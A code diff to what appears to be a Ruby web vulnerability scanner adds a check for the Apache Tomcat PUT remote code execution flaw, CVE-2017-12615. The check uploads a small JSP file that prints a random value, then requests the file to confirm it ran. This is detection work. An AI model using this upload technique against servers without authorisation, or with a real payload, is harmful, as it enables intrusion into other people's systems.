@@ -1,4 +1,5 @@
-require "base64"
+require 'base64'
+require 'securerandom'
 
 module Yawast
   module Scanner
@@ -45,6 +46,7 @@ module Yawast
             check_server_info(uri.copy)
             check_tomcat_manager(uri.copy)
             check_tomcat_version(uri.copy)
+            check_tomcat_put_rce(uri.copy)
           end
 
           def self.check_server_status(uri)
@@ -122,6 +124,25 @@ module Yawast
             if ret.include?('<font size="+2">Tomcat Web Application Manager</font>') ||
                 ret.include?('<font size="+2">Tomcat Virtual Host Manager</font>')
               Yawast::Utilities.puts_vuln "Apache Tomcat #{manager} weak password: #{credentials}"
+            end
+          end
+
+          def self.check_tomcat_put_rce(uri)
+            # CVE-2017-12615
+            uri.path = "/#{SecureRandom.hex}.jsp/"
+            uri.query = '' if uri.query != nil
+
+            # we'll use this to verify that it actually worked
+            check_value = SecureRandom.hex
+
+            # upload the JSP file
+            req_data = "<% out.println(\"#{check_value}\");%>"
+            Yawast::Shared::Http.put(uri, req_data)
+
+            # check to see of we get check_value back
+            res = Yawast::Shared::Http.get(uri)
+            if res.include? check_value
+              Yawast::Utilities.puts_vuln "Apache Tomcat PUT RCE (CVE-2017-12615): #{uri}"
             end
           end
 
